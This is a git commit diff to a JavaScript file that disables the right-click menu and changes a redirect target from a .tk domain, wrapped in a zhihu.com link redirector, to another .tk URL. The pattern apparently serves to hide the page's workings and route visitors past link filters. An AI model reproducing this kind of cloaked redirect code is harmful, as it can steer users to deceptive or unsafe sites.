d907ce8f58d96bc15cab01d7d3d44ebc46391186
meili555 <135024085+meili555@users.noreply.github.com>
2025-03-10 15:47:57 +0800

    Update 1.js

--- x/js/1.js
+++ x/js/1.js
@@ -17,7 +17,7 @@ setInterval(function () {
 
 
 document.oncontextmenu = function () { return false; };    
- var x='https://link.zhihu.com/?target=https://k439.tk/?6126';
+ var x='https://www.kuangjia.tk/1/x.html';
     $(function () {
         let u = window.document.location.href.toString().split("?");
         if (typeof (u[1]) == "string") {
